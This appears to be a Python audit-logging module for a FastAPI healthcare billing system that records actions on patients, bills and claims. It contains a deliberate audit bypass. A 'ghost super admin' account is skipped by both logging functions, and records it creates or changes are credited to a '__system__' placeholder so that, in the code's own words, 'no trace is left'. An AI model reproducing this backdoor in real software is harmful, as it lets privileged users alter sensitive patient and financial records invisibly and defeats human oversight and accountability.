"""
Audit logging utility for tracking user activities
"""
import json
from typing import Optional, Dict, Any
from fastapi import Request
from sqlalchemy.orm import Session
from app.models.audit_log import AuditLog
from app.models.user import User

# Username of the placeholder user used for created_by/updated_by when super admin acts (ghost)
SYSTEM_USERNAME = "__system__"


def is_super_admin(user: User) -> bool:
    """Return True if user is the ghost super admin (no audit, no trace in records)."""
    return getattr(user, "is_super_admin", False)


def get_system_user(db: Session) -> Optional[User]:
    """Return the system placeholder user used for created_by when super admin performs actions."""
    return db.query(User).filter(User.username == SYSTEM_USERNAME).first()


def get_effective_creator_id(db: Session, current_user: User) -> int:
    """
    Return the user id to store for created_by/updated_by/performed_by.
    For super admin (ghost account), returns the system user id so no trace is left.
    """
    if is_super_admin(current_user):
        system_user = get_system_user(db)
        if system_user:
            return system_user.id
    return current_user.id


def set_audit_summary(request: Request, summary: str) -> None:
    """Set a human-readable audit summary for the current request. Middleware will use this when logging."""
    request.state.audit_summary = summary


def get_client_ip(request: Request) -> Optional[str]:
    """Extract client IP address from request"""
    if request.client:
        return request.client.host
    # Try to get from headers (for proxies)
    forwarded = request.headers.get("X-Forwarded-For")
    if forwarded:
        return forwarded.split(",")[0].strip()
    real_ip = request.headers.get("X-Real-IP")
    if real_ip:
        return real_ip
    return None


def create_audit_log(
    db: Session,
    user: User,
    action: str,
    resource_type: Optional[str] = None,
    resource_id: Optional[int] = None,
    details: Optional[Dict[str, Any]] = None,
    summary: Optional[str] = None,
    ip_address: Optional[str] = None,
    endpoint_path: Optional[str] = None,
    http_method: Optional[str] = None
) -> Optional[AuditLog]:
    """
    Create an audit log entry
    
    Args:
        db: Database session
        user: User performing the action
        action: Action performed (e.g., "CREATE", "UPDATE", "DELETE", "VIEW", "LOGIN", "LOGOUT")
        resource_type: Type of resource (e.g., "Patient", "Bill", "Claim", "Encounter")
        resource_id: ID of the resource being acted upon
        details: Additional details as a dictionary (will be JSON serialized)
        summary: Human-readable sentence for auditors (e.g. "Admin changed role for John Doe from Admin to Billing")
        ip_address: IP address of the client
        endpoint_path: API endpoint path (e.g., "/api/patients/123")
        http_method: HTTP method (e.g., "GET", "POST", "PUT", "DELETE")
    
    Returns:
        AuditLog: The created audit log entry
    """
    if is_super_admin(user):
        return None  # Ghost account: no audit trail
    # Serialize details to JSON string if provided
    details_str = None
    if details:
        try:
            details_str = json.dumps(details, default=str)
        except (TypeError, ValueError):
            details_str = str(details)
    
    audit_log = AuditLog(
        user_id=user.id,
        username=user.username,
        full_name=user.full_name,
        role=user.role,
        action=action,
        resource_type=resource_type,
        resource_id=resource_id,
        details=details_str,
        summary=summary,
        ip_address=ip_address,
        endpoint_path=endpoint_path,
        http_method=http_method
    )
    
    db.add(audit_log)
    db.commit()
    db.refresh(audit_log)
    
    return audit_log


def log_activity(
    db: Session,
    user: User,
    request: Request,
    action: str,
    resource_type: Optional[str] = None,
    resource_id: Optional[int] = None,
    details: Optional[Dict[str, Any]] = None,
    summary: Optional[str] = None,
    endpoint_path: Optional[str] = None,
    http_method: Optional[str] = None
):
    """
    Convenience function to log activity with automatic IP extraction
    
    Args:
        db: Database session
        user: User performing the action
        request: FastAPI request object
        action: Action performed
        resource_type: Type of resource
        resource_id: ID of the resource
        details: Additional details
        endpoint_path: API endpoint path (defaults to request.url.path)
        http_method: HTTP method (defaults to request.method)
    """
    if is_super_admin(user):
        return  # Ghost account: no audit trail
    try:
        ip_address = get_client_ip(request)
        # Use request path and method if not provided
        if endpoint_path is None:
            endpoint_path = request.url.path
        if http_method is None:
            http_method = request.method
        create_audit_log(
            db=db,
            user=user,
            action=action,
            resource_type=resource_type,
            resource_id=resource_id,
            details=details,
            summary=summary,
            ip_address=ip_address,
            endpoint_path=endpoint_path,
            http_method=http_method
        )
    except Exception as e:
        # Don't let audit logging failures break the application
        print(f"Warning: Failed to create audit log: {e}")
        import traceback
        traceback.print_exc()

